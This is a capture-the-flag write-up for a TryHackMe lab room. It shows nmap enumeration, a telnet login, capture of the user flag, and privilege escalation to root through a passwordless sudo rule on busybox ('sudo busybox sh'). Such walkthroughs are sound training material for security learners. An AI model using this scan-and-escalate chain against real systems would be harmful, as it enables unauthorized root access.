# Room
https://tryhackme.com/room/bebop

# Task 1 - Deploy
Codename: pilot
# Task 2 - Manoeuvre
* Enumeration - nmap
    ```
    nmap -A -T4 10.10.82.192

    Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-27 18:45 EST
    Nmap scan report for 10.10.82.192
    Host is up (0.13s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.5 (FreeBSD 20170903; protocol 2.0)
    | ssh-hostkey: 
    |   2048 5b:e6:85:66:d8:dd:04:f0:71:7a:81:3c:58:ad:0b:b9 (RSA)
    |   256 d5:4e:18:45:ba:d4:75:2d:55:2f:fe:c9:1c:db:ce:cb (ECDSA)
    |_  256 96:fc:cc:3e:69:00:79:85:14:2a:e4:5f:0d:35:08:d4 (ED25519)
    23/tcp open  telnet  BSD-derived telnetd
    Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 19.77 seconds
    ```
* Gaining access - telnet
    ```
    telnet 10.10.82.192
    Trying 10.10.82.192...
    Connected to 10.10.82.192.
    Escape character is '^]'.
    login: pilot
    Last login: Sat Oct  5 23:48:53 from cpc147224-roth10-2-0-cust456.17-1.cable.virginm.net
    FreeBSD 11.2-STABLE (GENERIC) #0 r345837: Thu Apr  4 02:07:22 UTC 2019

    Welcome to FreeBSD!

    Release Notes, Errata: https://www.FreeBSD.org/releases/
    Security Advisories:   https://www.FreeBSD.org/security/
    FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
    FreeBSD FAQ:           https://www.FreeBSD.org/faq/
    Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
    FreeBSD Forums:        https://forums.FreeBSD.org/

    Documents installed with the system are in the /usr/local/share/doc/freebsd/
    directory, or can be installed later with:  pkg install en-freebsd-doc
    For other languages, replace "en" with a language code like de or fr.

    Show the version of FreeBSD installed:  freebsd-version ; uname -a
    Please include that output and any error messages when posting questions.
    Introduction to manual pages:  man man
    FreeBSD directory layout:      man hier

    Edit /etc/motd to change this login announcement.
    Need to remove all those ^M characters from a DOS file? Try

            tr -d \\r < dosfile > newfile
                    -- Originally by Dru <genesis@istar.ca>
    [pilot@freebsd ~]$ 
    ```
* User flag
    ```
    [pilot@freebsd ~]$ ls -lrta
    total 44
    drwxr-xr-x  5 root   wheel   512 Oct  5  2019 ..
    -rw-r--r--  1 pilot  pilot  1053 Oct  5  2019 .cshrc
    -rw-r--r--  1 pilot  pilot   390 Oct  5  2019 .login
    -rw-r--r--  1 pilot  pilot   161 Oct  5  2019 .login_conf
    -rw-r--r--  1 pilot  pilot   334 Oct  5  2019 .mailrc
    -rw-r--r--  1 pilot  pilot   950 Oct  5  2019 .profile
    -rw-r--r--  1 pilot  pilot   849 Oct  5  2019 .shrc
    -rw-------  1 pilot  pilot   377 Oct  5  2019 .mail_aliases
    -rw-------  1 pilot  pilot   279 Oct  5  2019 .rhosts
    -rw-r--r--  1 root   pilot    26 Oct  5  2019 user.txt
    lrwxr-xr-x  1 pilot  pilot     9 Oct  5  2019 .bash_history -> /dev/null
    drwxr-xr-x  2 pilot  pilot   512 Oct  5  2019 .
    [pilot@freebsd ~]$ cat user.txt
    [removed]
    ```
* Privilege Escalation - check sudo -l
    ```
    [pilot@freebsd ~]$ sudo -l
    User pilot may run the following commands on freebsd:
        (root) NOPASSWD: /usr/local/bin/busybox
    ```
* Privilege Escalation - research busybox
    ```
    https://gtfobins.github.io/gtfobins/busybox/#sudo

    [pilot@freebsd ~]$ sudo /usr/local/bin/busybox sh
    # whoami
    root
    # ls -lrta /root
    total 64
    -rw-r--r--   2 root  wheel  472 Apr  4  2019 .profile
    -rw-r--r--   1 root  wheel  393 Apr  4  2019 .login
    -rw-r--r--   1 root  wheel  147 Apr  4  2019 .k5login
    -rw-r--r--   2 root  wheel  955 Apr  4  2019 .cshrc
    lrwxr-xr-x   1 root  wheel    9 Oct  5  2019 .bash_history -> /dev/null
    -rw-r--r--   1 root  wheel   32 Oct  5  2019 root.txt
    -rw-------   1 root  wheel  829 Oct  5  2019 .history
    drwxr-xr-x   2 root  wheel  512 Oct  5  2019 .
    drwxr-xr-x  19 root  wheel  512 Jan 27 23:43 ..
    # cat /root/root.txt
    [removed]
    ```
# Task 3 - Quiz
Answer questions based on results
# Task 4 - Closing
Watch the video